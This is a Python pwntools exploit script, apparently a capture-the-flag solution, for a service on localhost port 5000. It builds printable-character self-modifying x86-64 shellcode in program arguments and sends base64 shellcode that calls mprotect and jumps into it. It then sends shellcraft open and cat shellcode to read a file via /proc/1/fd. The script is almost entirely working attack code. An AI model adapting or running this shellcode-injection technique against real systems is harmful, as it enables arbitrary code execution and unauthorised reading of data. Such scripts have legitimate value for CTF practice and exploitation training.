#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"

serv = "localhost"
port = 5000

xs = [
    asm("""
        pop rdi
        push 0x22
        pop rax
        push 0x5a5a5a5a
        pop rcx
        and al, 0x42
        pop rbx
        xor word ptr [rbx+0x21+0x39], cx
        push rbp
        pop rsi
        jnz $+0x6a
    """),
    #b"."+b"flag.txt".rjust(len(b"/proc/1/fd/1")-1, b"/"),
    b"/proc/1/fd/0",
    b"Z"*(0x21+0x39)+p8(0x5a^0x0f)+p8(0x5a^0x05)+p8(0x70),
    asm("""
        push 0x5a5a5a5a
        pop rdx
        pop rbx
        xor word ptr[rbx+0x5a], dx
        push rax
        pop rdi
        push rcx
        pop rsi
        push rbp
        pop rax
        push 0x5a5a5a5a
        push 0x5a5a5a5a
        pop rdx
        pop rdx
        jnz $+0x3d
    """),
    b"Z"*0x3a+p8(0x5a^0x0f)+p8(0x5a^0x05),
]
total = -1
for x in xs:
    for b in x:
        if chr(b) not in string.printable:
            print("invalid argument: ", x)
            exit()
    total += len(x)+1
xs.append(b"Z"*(0xf5a-total))

def cong():
    txs = xs
    if len(txs) < 0x1104f:
        txs += [b"Z"]*(0x1104f-len(txs))
    return b" ".join(txs)

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        if args.TMP:
            os.system("mv /tmp/vuln ./tmp; chmod +x ./tmp")
            r = gdb.debug(["./tmp"]+xs, gdbscript="""
                #si
                #si
                #si
                #si
                #si
                #set *(long*)$rsp=0x11050
                #si
                #si
                #si
                #si
                #si
                #si
                #si
                #si
                #si
                #si
            """)
            #r = process(["./tmp"]+argv().split())
            #gdb.attach(r)
        else:
            r = process(["python3", "./run.py"])
    return r

r = conn()

def main():
    if args.TMP:
        r.interactive()
        exit()
    shc = asm("""
        pop rdi
        pop rdi
        mov ch, 0xf0
        push rcx
        pop rsi
        mov dl, 7
        mov al, 10
        syscall
        jmp rdi
    """)
    r.sendline(base64.b64encode(shc))
    pl = cong()

    #f = open("wtf", "wb")
    #f.write(pl)
    #f.close()

    print(len(pl))
    for i in range(0, len(pl), 0x100):
        r.sendline(pl[i:i+0x100])
    r.sendline(b"")
    shc = b"\x90"*0x100
    shc += asm(shellcraft.open("/proc/1/fd/1", 1))
    shc += asm(shellcraft.cat("A"*255, 4))
    r.sendafter(b"ZZZZzzzzZZZZzzzzZZZZzzzz", shc)
    r.interactive()


if __name__ == "__main__":
    main()
